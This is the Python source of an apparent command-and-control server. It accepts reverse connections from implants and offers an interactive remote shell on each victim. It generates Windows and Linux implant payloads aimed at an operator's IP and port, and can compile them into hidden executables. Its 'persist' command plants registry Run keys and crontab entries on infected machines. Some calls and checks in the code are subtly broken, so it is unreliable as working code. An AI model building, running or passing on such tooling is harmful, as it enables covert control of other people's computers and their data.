import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime
import random
import string
import os
import os.path
import shutil
import subprocess

def banner():
    print("   ___            _ _         ___ ____  _ \n  / _ \__ _  __ _| (_) __ _  / __\___ \(_)\n / /_)/ _` |/ _` | | |/ _` |/ /    __) | |\n/ ___/ (_| | (_| | | | (_| / /___ / __/| |\n\/    \__,_|\__, |_|_|\__,_\____/|_____|_|\n            |___/                         \n")

def winplant():
    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f"{ran_name}.py"
    check_cwd = os.getcwd()
    
    if os.path.exists(f"{check_cwd}/winplant.py"):
        shutil.copy("winplant.py", file_name)

    else:
        print("[!] winplant.py not found.")
    
    with open(file_name) as f:
        new_host = f.read().replace("INPUT_IP_HERE", host_ip)

    with open(file_name, "w") as f:
        f.write(new_host)
        f.close()

    with open(file_name) as f:
        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
    
    with open(file_name, "w") as f:
        f.write(new_port)
        f.close()
    
    if os.path.exists(f"{file_name}"):
        print(f"[+] {file_name} saved to {check_cwd}.")
    
    else: 
        print("[!] Error occurred during payload generation.")



def linplant():
    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f"{ran_name}.py"
    check_cwd = os.getcwd()
    
    if os.path.exists(f"{check_cwd}/linplant.py"):
        shutil.copy("linplant.py", file_name)

    else:
        print("[!] linplant.py not found.")

    with open(file_name) as f:
        new_host = f.read().replace("INPUT_IP_HERE", host_ip)

    with open(file_name, "w") as f:
        f.write(new_host)
        f.close()

    with open(file_name) as f:
        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
    
    with open(file_name, "w") as f:
        f.write(new_port)
        f.close()
    
    if os.path.exists(f"{file_name}"):
        print(f"[+] {file_name} saved to {check_cwd}.")
    
    else: 
        print("[!] Error occurred during payload generation.")

def exeplant():
    ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f"{ran_name}.py"
    exe_file = f"{ran_name}.exe"
    check_cwd = os.getcwd()
    
    if os.path.exists(f"{check_cwd}/winplant.py"):
        shutil.copy("winplant.py", file_name)

    else:
        print("[!] winplant.py not found.")

    with open(file_name) as f:
        new_host = f.read().replace("INPUT_IP_HERE", host_ip)

    with open(file_name, "w") as f:
        f.write(new_host)
        f.close()

    with open(file_name) as f:
        new_port = f.read().replace("INPUT_PORT_HERE", str(host_port))
    
    with open(file_name, "w") as f:
        f.write(new_port)
        f.close()

        pyinstaller_exec = ["pyinstaller", file_name, "-w", "--clean", "--onefile", "--distpath",  "."]
        print(f"[+] Compiling executable {exe_file}...")
        subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
        os.remove(f"{ran_name}.spec")
        shutil.rmtree("build")

        if os.path.exists(f"{check_cwd}/{exe_file}") or os.path.exists(f"{check_cwd}/{ran_name}"):
            print(f"[+] {exe_file} saved to current directory.")
        
        else:
            print("[!] Error occurred during payload generation.")

def comm_in(targ_id):
    print("[+] Awaiting response...")
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input("@> ")
        comm_out(targ_id, message)
        if message == "exit":
            targ_id.send(message.encode())
            targ_id.close()
            break

        if message == "background":
            break

        if message == "help":
            pass

        if message == "persist":
            payload_name = input("[+] Enter name of payload to add to autorun: ")
            if targets[num][6] == 1:
                persist_command_1 = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
                targ_id.send(persist_command_1.encode())
                persist_command_2 = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
                targ_id.send(persist_command_2.encode())
                print("[+] Persistence technique completed.")
                print("[+] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")

            if targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                targ_id.send(persist_command.encode())
                print("[+] Persistence technique completed.")
                print("[+] Run this command to clean up the crontab: \n crontab -r")
        else:
            response = comm_in(targ_id)
            if response == "exit":
                print("[!] The client has terminated the session.")
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, host_port))
    print("[+] Awaiting connection from client...")
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()


def comm_handler():
    while True:
        if kill_flag == 1:
            break

        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            op_sys = remote_target.recv(1024).decode()

            if admin == 1:
                admin_val = "Yes"
            
            elif username == "root":
                admin_val == "Yes"
                
            else:
                admin_val = "No"

            if "Windows" in op_sys:
                pay_val =1
            
            else:
                pay_val = 2

            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val])
            
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f"\n[+] Connection received from {host_name[0]}{remote_ip[0]}\n" + "@> ", end="")
        
        except:
            pass


if __name__ == "__main__":
    targets = []
    listener_counter = 0
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            command = input("#> ")

            if command == "listeners -g":
                host_ip = input("[*] Enter IP to listen on: ")
                host_port = int(input("[*] Enter port to listen on: "))
                listener_handler()
                listener_counter += 1

            if command == "winplant":
                if listener_counter > 0:
                    winplant()
                
                else:
                    print("[!] You cannot generate a payload without an active listener.")

            
            if command == "linplant":
                if listener_counter > 0:
                    linplant()
                
                else:
                    print("[!] You cannot generate a payload without an active listener.")
            
            if command == "exeplant":
                if listener_counter > 0:
                    exeplant()
                
                else:
                    print("[!] You cannot generate a payload without an active listener.")

            if command.split(" ")[0] == "sessions":
                session_counter = 0
                
                #List sessions command handling
                if command.split(" ")[1] == "-l":
                    myTable = PrettyTable()
                    myTable.field_names = ["Session", "Status", "Username", "Admin", "Target", "Operating System", "Contact Time"]
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, "Placeholder", target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(myTable)

                if command.split(" ")[1] == "-i":
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id, targets, num)
        
        except IndexError:
            print("[-] Command requires argument(s).")
            continue
        
        except KeyboardInterrupt:
            print("\n[+] Keyboard interrupt issued.")
            kill_flag = 1
            sock.close()
            break
